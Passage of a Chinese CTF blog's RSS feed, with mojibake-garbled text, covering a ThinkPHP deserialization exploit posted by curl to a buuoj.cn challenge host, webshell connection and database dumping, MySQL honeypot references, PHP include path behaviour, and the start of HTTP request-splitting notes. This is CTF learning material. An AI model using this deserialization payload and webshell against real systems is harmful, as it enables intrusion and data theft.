&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#d88200">&amp;#34;where&amp;#34;&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#d88200">&amp;#34;1=1&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">namespace&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#75af00">base64_encode&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">serialize&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">Think\Image\Driver\Imagick&lt;/span>&lt;span style="color:#111">()));&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">$curl&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">curl_init&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">curl_setopt_array&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$curl&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#00a8c8">array&lt;/span>&lt;span style="color:#111">(&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">CURLOPT_URL&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#d88200">&amp;#34;http://914146f1-7d08-4a0a-9659-c143df1d68e1.node4.buuoj.cn:81/&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">CURLOPT_RETURNTRANSFER&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#00a8c8">true&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">CURLOPT_ENCODING&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">CURLOPT_MAXREDIRS&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#ae81ff">10&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">CURLOPT_TIMEOUT&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#ae81ff">3&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">CURLOPT_HTTP_VERSION&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#75af00">CURL_HTTP_VERSION_1_1&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">CURLOPT_CUSTOMREQUEST&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#d88200">&amp;#34;POST&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">CURLOPT_POSTFIELDS&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#75af00">base64_encode&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">serialize&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">Think\Image\Driver\Imagick&lt;/span>&lt;span style="color:#111">())),&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">CURLOPT_HTTPHEADER&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#00a8c8">array&lt;/span>&lt;span style="color:#111">(&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#d88200">&amp;#34;cache-control: no-cache&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">),&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">));&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">$response&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">curl_exec&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$curl&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">$err&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">curl_error&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$curl&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">curl_close&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$curl&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$err&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#d88200">&amp;#34;cURL Error #:&amp;#34;&lt;/span> &lt;span style="color:#f92672">.&lt;/span> &lt;span style="color:#111">$err&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span> &lt;span style="color:#00a8c8">else&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#111">$response&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>å…¶ä¸­curlçš„ä»£ç æ˜¯ç”¨postmanç”Ÿæˆçš„ &lt;del>ï¼ˆpostmanæ‰“é’±ï¼‰&lt;/del> ä¸€å¥—è¿æ‹›ç›´æ¥å¸¦èµ°ï¼Œç”¨èšå‰‘è¿æ¥ä¹‹åå‘ç°æ ¹ç›®å½•ä¸‹æ²¡æœ‰flagï¼Œåè€Œæ˜¯ä¸€ä¸ªflag.sh&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211219194548981.png" alt="image-20211219194548981">&lt;/p>
&lt;p>æˆ‘ä»¬è¿˜å¾—è¿ä¸Šæ•°æ®åº“çœ‹çœ‹&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211219195443288.png" alt="image-20211219195443288">&lt;/p>
&lt;p>ä½†æ˜¯èšå‰‘è‡ªå¸¦çš„æ·»åŠ å¤±è´¥ï¼Œç›´æ¥æ‰‹åŠ¨å†™ä¸€ä¸ªå†°èçš„ğŸ&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211219195808735.png" alt="image-20211219195808735">&lt;/p>
&lt;p>ç›´æ¥æŸ¥çœ‹ä¹Ÿæ˜¯æ²¡æœ‰ï¼Œä½†æ˜¯å¯ä»¥ç”¨å®ƒçš„å¯¼å‡ºæ•°æ®åº“çš„åŠŸèƒ½å¾—åˆ°æ•°æ®&lt;/p>
&lt;p>å‚è€ƒï¼š&lt;a href="https://www.zhaoj.in/read-6859.html#WEB3_easytp">wp1&lt;/a> | &lt;a href="http://www.yang99.top/index.php/archives/48/#easytp">wp2&lt;/a>&lt;/p>
&lt;h2 id="ddctf-2019mysqlå¼±å£ä»¤">[DDCTF 2019]MySQLå¼±å£ä»¤&lt;/h2>
&lt;p>æ²¡æ‰¾åˆ°ç¯å¢ƒï¼Œçœ‹wpäº‘ä¸€ä¸‹&lt;/p>
&lt;p>éƒ¨ç½²å¥½agent.pyä¹‹åç”¨bettercapï¼Œè¯»/root/.mysql_historyæ‹¿flagä¸€æ³¢å¸¦èµ°&lt;/p>
&lt;p>å‚è€ƒï¼š&lt;a href="https://yelo.cc/2019/04/18/ddctf-2019-writeups-web-7.html">wp&lt;/a>&lt;/p>
&lt;h2 id="ä¸€ä¸ªä¸­ç­‰å¥½çš„èœœç½">ä¸€ä¸ªä¸­ç­‰å¥½çš„èœœç½&lt;/h2>
&lt;p>ä¹‹æ‰€ä»¥è¯´ä¸­ç­‰å¥½ï¼Œæ˜¯å› ä¸ºå®ƒå—åˆ¶äºå¯¹åº”æ•°æ®åº“çš„ç‰ˆæœ¬å’Œé…ç½®æƒ…å†µï¼Œæ‰€ä»¥å¹¶ä¸å¤Ÿé€šç”¨ï¼Œå¯ä»¥å‚è€ƒä»¥ä¸‹ä¸¤ä¸ªæ —å­ï¼š&lt;/p>
&lt;p>å‚è€ƒï¼š&lt;a href="https://mp.weixin.qq.com/s/m4I_YDn98K_A2yGAhv67Gg">MySQLèœœç½è·å–æ”»å‡»è€…å¾®ä¿¡ID&lt;/a> | &lt;a href="https://mp.weixin.qq.com/s/rQ9BpavBeMnS6xUOidZ5OA">æº¯æºååˆ¶ä¹‹MySQLèœœç½ç ”ç©¶&lt;/a>&lt;/p>
&lt;hr>
&lt;p>å””ï¼Œæ˜¯7æœˆåšé¢˜çš„æ—¶å€™ç¢°åˆ°çš„ç‚¹ï¼Œä»Šå¤©åšé¢˜åˆç¢°åˆ°äº†ï¼Œäºæ˜¯æ‹¿å‡ºæ¥é­ä¸ªå°¸ï¼Œæ¯”ä¹‹å‰çš„ç†è§£è¦æ·±åˆ»ä¸€äº›äº†&lt;/p>
&lt;p>æœ€è¿‘åœ¨çœ‹jsåŸå‹æ±¡æŸ“çš„ç›¸å…³é—®é¢˜ï¼Œç»“æœè€ƒäº†ä¸ªå››çº§ä¹‹åä¹‹å‰å†™çš„ä»£ç éƒ½ä¸è®¤å¾—äº†ğŸ˜…å°ä¸‘ç«Ÿæ˜¯æˆ‘è‡ªå·±&lt;/p>
&lt;hr>
&lt;details>
&lt;summary>
&lt;h4 class="inline">
ä»¥ä¸‹æ˜¯æœ¬æ–‡ä¸­æ¶‰åŠåˆ°çš„ å’Œæˆ‘å­¦ä¹ æ—¶çœ‹è¿‡çš„æ‰€æœ‰æ–‡ç« çš„é“¾æ¥ğŸ”— æ¯æ—¥æ„Ÿè°¢äº’è”ç½‘çš„ä¸°å¯Œèµ„æºï¼ˆ
&lt;/h4>
&lt;/summary>
&lt;ul>
&lt;li>&lt;a href="http://russiansecurity.expert/2016/04/20/mysql-connect-file-read/">MySQL connect file read&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://lightless.me/archives/read-mysql-client-file.html">Read MySQL Client&amp;rsquo;s File&lt;/a> | &lt;a href="https://xz.aliyun.com/t/3277">ä»MySQLå‡ºå‘çš„åå‡»ä¹‹è·¯&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://www.anquanke.com/post/id/106488">å¦‚ä½•åˆ©ç”¨MySQL LOCAL INFILEè¯»å–å®¢æˆ·ç«¯æ–‡ä»¶&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://mp.weixin.qq.com/s/m4I_YDn98K_A2yGAhv67Gg">MySQLèœœç½è·å–æ”»å‡»è€…å¾®ä¿¡ID&lt;/a> | &lt;a href="https://mp.weixin.qq.com/s/rQ9BpavBeMnS6xUOidZ5OA">æº¯æºååˆ¶ä¹‹MySQLèœœç½ç ”ç©¶&lt;/a>&lt;/li>
&lt;/ul>
&lt;/details></description></item><item><title>å…³äºinclude/require(_once)çš„æ˜“æ··æ·†ç‚¹</title><link>https://amiaaaz.github.io/2021/12/13/smth-about-include-require-in-php/</link><pubDate>Mon, 13 Dec 2021 01:12:22 +0800</pubDate><guid>https://amiaaaz.github.io/2021/12/13/smth-about-include-require-in-php/</guid><description>&lt;p>ä¹‹å‰åšé¢˜é‡åˆ°åæŸ¥äº†ä¸€ä¸‹ç›¸å…³æ–‡ç« ï¼Œè§‰å¾—å¾ˆé€‚åˆå‡ºé¢˜ï¼Œä½†æ˜¯æ„Ÿè§‰ä¸èƒ½ä¸ºäº†è€ƒè€Œè€ƒï¼Œä¹Ÿå°±å¤±å»äº†CTFçš„æ„ä¹‰ï¼Œæ‰€ä»¥è¿˜ä¸å¦‚å…ˆå‘å‡ºæ¥è¿™ä¸€ç¯‡&lt;/p>
&lt;p>&lt;del>ï¼ˆåˆ«éª‚äº† å°±æ˜¯æ‡’&lt;/del>&lt;/p>
&lt;h2 id="å…³äºincluderequire_once">å…³äº&lt;code>include/require(_once)()&lt;/code>&lt;/h2>
&lt;p>è¿™å‡ ä¸ªå‡½æ•°åº”è¯¥éƒ½ä¸é™Œç”Ÿï¼ˆè¿˜åº”è¯¥å†åŠ ä¸Šinclude_pathï¼‰ï¼Œå¹²çš„æ˜¯æ–‡ä»¶åŒ…å«çš„äº‹ï¼›å…ˆæŒ‰ç…§ç»™å®šå‚æ•°å¯»æ‰¾è·¯å¾„ï¼ˆå½“å®šä¹‰äº†è·¯å¾„åˆ™ä¼šå®Œå…¨å¿½ç•¥include_pathï¼‰ï¼Œå¦‚æœåªæœ‰æ–‡ä»¶ååˆ™æŒ‰ç…§include_pathçš„æŒ‡å®šç›®å½•å¯»æ‰¾ï¼Œå¦‚æœè¿˜æ²¡æ‰¾åˆ°åˆ™ä¼šåœ¨è°ƒç”¨è„šæœ¬æ–‡ä»¶æ‰€åœ¨çš„ç›®å½•å’Œå½“å‰å·¥ä½œç›®å½•ä¸‹å¯»æ‰¾ï¼›ä¸‹é¢è¯´å‡ ä¸ªå°ç‚¹&lt;/p>
&lt;p>é¦–å…ˆæ˜¯requireå’Œincludeçš„åŒºåˆ«åœ¨äºrequireåœ¨å‡ºé”™æ—¶ä¼šäº§ç”ŸE_COMPILE_ERRORçº§åˆ«çš„é”™è¯¯ï¼Œè„šæœ¬å°†ä¸­æ­¢è¿è¡Œï¼Œè€Œincludeåªä¼šäº§ç”Ÿè­¦å‘ŠE_WARNINGï¼Œä¸å½±å“ç»§ç»­é¡¶ç€é”™è¯¯ç»§ç»­æ‰§è¡Œè„šæœ¬ï¼ˆåšé¢˜å¾ˆå¸¸è§è¿™ä¸ª æ— æ•°çš„æŠ¥é”™ä¸‹é¢æœ‰æ­£å¸¸çš„å›æ˜¾ï¼‰&lt;/p>
&lt;p>å¦ä¸€ä¸ªåŒºåˆ«åœ¨äºrequireæ˜¯æ— æ¡ä»¶åŒ…å«å‡½æ•°ï¼Œå³ç¨‹åºæ‰§è¡Œå‰å°±ä¼šå°†æ–‡ä»¶å†…å®¹ä»¥æ–‡æœ¬æ›¿æ¢çš„å½¢å¼å¼•å…¥ï¼ˆæ‰€ä»¥è¿™ä»½æ–‡ä»¶åªè¢«å¤„ç†ä¸€æ¬¡ï¼‰ï¼Œè®©å®ƒå˜ä¸ºphpè„šæœ¬çš„ä¸€éƒ¨åˆ†ï¼ˆæ‰€ä»¥é€šå¸¸æ”¾åœ¨phpæ–‡ä»¶çš„æœ€å‰é¢ï¼‰ï¼›includeåˆ™æ˜¯æœ‰æ¡ä»¶åŒ…å«å‡½æ•°ï¼Œç”¨åˆ°æ—¶æ‰è¢«åŠ è½½ï¼Œä¸”æ¯æ¬¡æ‰§è¡Œæ–‡ä»¶æ—¶éƒ½è¦è¿›è¡Œè¯»å–å’Œè¯„ä¼°&lt;/p>
&lt;p>å½“phpé‡åˆ°require/include(_once)å‡½æ•°æ—¶ï¼Œå¦‚æœç»™å®šçš„å‚æ•°æ˜¯ä¸ªç»å¯¹è·¯å¾„åˆ™ç›´æ¥å¼•å…¥ï¼Œä½†å¦‚æœç»™çš„æ˜¯ç›¸å¯¹è·¯å¾„ï¼Œåˆ™è¦è¿›å…¥å¦å¤–çš„é€»è¾‘ï¼ˆç»è¿‡å¤šæ¬¡è°ƒç”¨ï¼Œå®å±•å¼€åè¿›å…¥_php_stream_fopen_with_pathï¼‰å¯»æ‰¾æ­¤æ–‡ä»¶ï¼›åœ¨_php_stream_fopen_with_pathä¼šæ ¹æ®include_pathå’Œå½“å‰æ‰§è¡Œæ–‡ä»¶çš„pathç»„æˆä¸€ä¸ªå¾…é€‰çš„ç›®å½•åˆ—è¡¨ï¼Œç„¶åä»åˆ—è¡¨å¤´éƒ¨å¼€å§‹æ ¹æ®DEFAULT_DIR_SEPARATORï¼ˆlinuxä¸‹é»˜è®¤ä¸º&lt;code>:&lt;/code> winä¸º&lt;code>;&lt;/code>ï¼‰å–å‡ºè·¯å¾„ï¼Œç„¶åæ‹¼ä¸Šæ–‡ä»¶åï¼Œå¦‚æœæˆåŠŸåˆ™è¿”å›ï¼Œå¤±è´¥åˆ™ç»§ç»­ä¸‹ä¸€ä¸ªå¾…é€‰æ‹©è·¯å¾„ï¼ˆ&lt;u>æ‰€ä»¥å¦‚æœæœ‰é‡åçš„å°±å¥½ç©äº†&lt;/u>ï¼‰&lt;/p>
&lt;h2 id="å‡ ä¸ªå¥½ç©çš„å°æ —å­">å‡ ä¸ªå¥½ç©çš„å°æ —å­&lt;/h2>
&lt;p>è¿™é‡Œä¸¾ä¸€ä¸ªå°æ —å­ï¼Œæ–‡ä»¶ç»“æ„å’Œå†…å®¹å¦‚ä¸‹ï¼ˆæ³¨æ„è¿™é‡Œinclude_pathçš„å†™æ³•!!!ä¸ä»…æœ‰path_to_subdirè¿˜æœ‰&lt;code>:&lt;/code>åˆ†éš”ç¬¦å‰é¢ä»£è¡¨çš„current_dir!!!ï¼‰&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211024095717109.png" alt="image-20211024095717109">&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211024095830345.png" alt="image-20211024095830345">&lt;/p>
&lt;p>åœ¨ä¸åŒçš„æƒ…å†µä¸‹è¿è¡Œçœ‹çœ‹æ•ˆæœ&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211024100007587.png" alt="image-20211024100007587">&lt;/p>
&lt;p>åœ¨rootç›®å½•ä¸‹æ‰§è¡Œæ—¶ï¼Œç›´æ¥æ ¹æ®1.phpçš„include_pathå¯»æ‰¾2.phpï¼Œè€Œ2.phpä¸­å¹¶æ²¡æœ‰è®¾ç½®include_pathï¼Œé‚£ä¹ˆè·¯å¾„å°±å˜æˆäº†åˆ—è¡¨ä¸­ç¬¬ä¸€ä¸ªå¾…é€‰æ‹©è·¯å¾„ å³&lt;code>&amp;quot;.&amp;quot;&lt;/code>ï¼Œè€Œå½“å‰å·¥ä½œç›®å½•æ˜¯rootï¼Œæ‰€ä»¥å°±æ˜¯/root/3.phpçš„è¾“å‡º&lt;/p>
&lt;p>æ¢åˆ°subdirç›®å½•ä¸‹æ‰§è¡Œ1.phpæ—¶ï¼Œåˆ—è¡¨ä¸­ç¬¬ä¸€ä¸ªå¾…é€‰æ‹©è·¯å¾„&lt;code>&amp;quot;.&amp;quot;&lt;/code>å˜ä¸ºäº†subdirï¼Œè‡ªç„¶è¾“å‡ºå˜ä¸ºäº†/root/subdir/3.phpçš„è¾“å‡º&lt;/p>
&lt;p>ç°åœ¨æˆ‘ä»¬æŠŠinclude_pathä»…ä¿ç•™path_to_subdirï¼Œç»§ç»­ä¸Šé¢çš„æŒ‡ä»¤è¿è¡Œä¸€ä¸‹&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211024190934131.png" alt="image-20211024190934131">&lt;/p>
&lt;p>é‚£ä¸ç®¡å½“å‰è·¯å¾„æ˜¯ä»€ä¹ˆéƒ½ä¼šå¾—åˆ°subdirçš„è¾“å‡º&lt;/p>
&lt;p>å†è¿›ä¸€æ­¥ï¼Œåœ¨2.phpä¸­åŠé“æ¸…ç©ºinclude_pathä¼šæ€ä¹ˆæ ·å‘¢&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211024191919122.png" alt="image-20211024191919122">&lt;/p>
&lt;p>æˆ‘ä»¬å‘ç°è·Ÿä¸Šé¢ç»“æœä¸€æ ·ï¼Œä½†æ˜¯è¿™é‡Œçš„é€»è¾‘å´æœ‰å·®å¼‚ï¼š2.phpä¸­æ¸…ç©ºinclude_pathåå†åŒ…å«æ–‡ä»¶å°†ä¼šè‡ªåŠ¨å˜ä¸ºcurrent_pathçš„è·¯å¾„ï¼Œè€Œ2.phpåœ¨/root/subdirä¸‹ï¼Œæ‰€ä»¥å›æ˜¾å’Œ2.phpçš„è·¯å¾„ä¿æŒä¸€è‡´&lt;/p>
&lt;p>å†å†è¿›ä¸€æ­¥&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211024192931075.png" alt="image-20211024192931075">&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211024193020147.png" alt="image-20211024193020147">&lt;/p>
&lt;p>è¯¶ï¼Œå¯ä»¥çœ‹åˆ°ç”±äºè¿™é‡Œä¸¤æ¬¡éƒ½ç”¨åˆ°äº†ç›¸å¯¹ç›®å½•çš„&lt;code>&amp;quot;./&amp;quot;&lt;/code>è¿›è¡Œå¼•ç”¨ï¼Œæ‰€ä»¥åœ¨/rootç›®å½•ä¸‹è¿è¡Œå¾ˆé¡ºç•…ï¼Œè€Œ/root/subdirç›®å½•ä¸‹ç”±äºä¸ä¼šå†å­˜åœ¨./subdir/2.phpï¼Œæ‰€ä»¥æŠ¥é”™é€€å‡º&lt;/p>
&lt;h2 id="ä½¿ç”¨æ³¨æ„">ä½¿ç”¨æ³¨æ„&lt;/h2>
&lt;ul>
&lt;li>åœ¨ä½¿ç”¨include_pathå’Œç›¸å¯¹è·¯å¾„æ—¶ä¼šå½±å“æ€§èƒ½ï¼Œæ‰€ä»¥æœ€å¥½ç”¨ç»å¯¹è·¯å¾„&lt;/li>
&lt;li>ç›®å½•ç›¸å¯¹è·¯å¾„çš„basediræ°¸è¿œæ˜¯å½“å‰å·¥ä½œè·¯å¾„&lt;/li>
&lt;li>å¯ä»¥é€šè¿‡&lt;code>__DIR__&lt;/code>æ¥è·å¾—ç»å¯¹è·¯å¾„&lt;/li>
&lt;li>å»ºè®®å°‘ä½¿ç”¨&lt;code>include/require_once&lt;/code>&lt;/li>
&lt;/ul>
&lt;hr>
&lt;p>*å†™çš„ä¸å…¨é¢ï¼Œè¿˜æœ‰ä¸€éƒ¨åˆ†éœ€è¦è¡¥å…… å…ˆé¸½äº†ï¼Œé‡åˆ°é¢˜æˆ–è€…å…·ä½“çš„åº”ç”¨åœºæ™¯æˆ‘è¡¥å……ä¸Šæ¥&lt;/p>
&lt;hr>
&lt;details>
&lt;summary>
&lt;h4 class="inline">
ä»¥ä¸‹æ˜¯æœ¬æ–‡ä¸­æ¶‰åŠåˆ°çš„ å’Œæˆ‘å­¦ä¹ æ—¶çœ‹è¿‡çš„æ‰€æœ‰æ–‡ç« çš„é“¾æ¥ğŸ”— æ¯æ—¥æ„Ÿè°¢äº’è”ç½‘çš„ä¸°å¯Œèµ„æºï¼ˆ
&lt;/h4>
&lt;/summary>
&lt;p>&lt;a href="https://www.laruence.com/2010/05/04/1450.html">æ·±å…¥ç†è§£PHPä¹‹require/includeé¡ºåº&lt;/a>&lt;/p>
&lt;/details></description></item><item><title>HTTPè¯·æ±‚åˆ‡åˆ†æ”»å‡»å­¦ä¹ ç¬”è®°</title><link>https://amiaaaz.github.io/2021/12/07/http-request-splitting-attack-study-notes/</link><pubDate>Tue, 07 Dec 2021 02:24:15 +0800</pubDate><guid>https://amiaaaz.github.io/2021/12/07/http-request-splitting-attack-study-notes/</guid><description>&lt;p>è¯´åˆ°ä¸HTTPè¯·æ±‚æœ‰å…³çš„æ”»å‡»æ–¹å¼èƒ½æƒ³åˆ°ä»€ä¹ˆï¼Ÿ&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211205111212810.png" alt="image-20211205111212810">&lt;/p>
&lt;p>&lt;del>æ˜¯ä¸æ˜¯ä¸€ä¸‹å­æç„¶å¤§æ˜ç™½äº†&lt;/del>&lt;/p>
&lt;p>è¿™ä¸€ç¯‡å°±æ˜¯å…¶ä¸­HTTP Request Splittingçš„å­¦ä¹ ç¬”è®°ï¼Œé•¿æœŸæ›´æ–°ï¼›å…¶å®ƒæ¨¡å—çš„ä¹Ÿä¼šéšåæ›´æ–°~&lt;/p>
&lt;p>è€è§„çŸ©ï¼Œæ‰€æœ‰çš„å‚è€ƒé“¾æ¥&amp;amp;dockeré“¾æ¥æ”¾åˆ°æ–‡æœ«&lt;/p>
&lt;h2 id="nodejs-httpè¯·æ±‚è·¯å¾„ä¸­çš„unicodeå­—ç¬¦æŸå">Node.js: httpè¯·æ±‚è·¯å¾„ä¸­çš„unicodeå­—ç¬¦æŸå&lt;/h2>
&lt;blockquote>
&lt;p>ä½¿ç”¨Node.jså‘ç‰¹å®šè·¯å¾„å‘å‡ºhttpè¯·æ±‚ï¼Œä½†æ˜¯å´è¢«å®šå‘åˆ°äº†ä¸ä¸€æ ·çš„è·¯å¾„&lt;/p>
&lt;/blockquote>
&lt;p>è™½ç„¶ç”¨æˆ·å‘å‡ºçš„httpè¯·æ±‚é€šå¸¸æ˜¯ä¸ªå­—ç¬¦ä¸²stringï¼Œä½†Node.jsæœ€ç»ˆå¿…é¡»å°†è¯·æ±‚ä»¥åŸå§‹å­—èŠ‚raw bytesè¾“å‡ºï¼Œjsæ”¯æŒunicodeï¼Œè¿™å…¶ä¸­æ¶‰åŠåˆ°äº†unicodeç¼–ç è½¬æ¢ã€‚å¯¹äºä¸åŒ…å«bodyçš„è¯·æ±‚ï¼ŒNode.jsé»˜è®¤ä½¿ç”¨&lt;code>latin1&lt;/code>ï¼Œå®ƒæ˜¯å•å­—èŠ‚ç¼–ç ï¼Œä¸èƒ½è¡¨ç¤ºé«˜ç¼–å·çš„unicodeå­—ç¬¦ï¼Œæ¯”å¦‚emoji ğŸ¶&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-js" data-lang="js">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">v&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;/caf\u{E9}\u{01F436}&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">console&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">log&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">v&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">w&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">Buffer&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">from&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">v&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;latin1&amp;#39;&lt;/span>&lt;span style="color:#111">).&lt;/span>&lt;span style="color:#75af00">toString&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;latin1&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
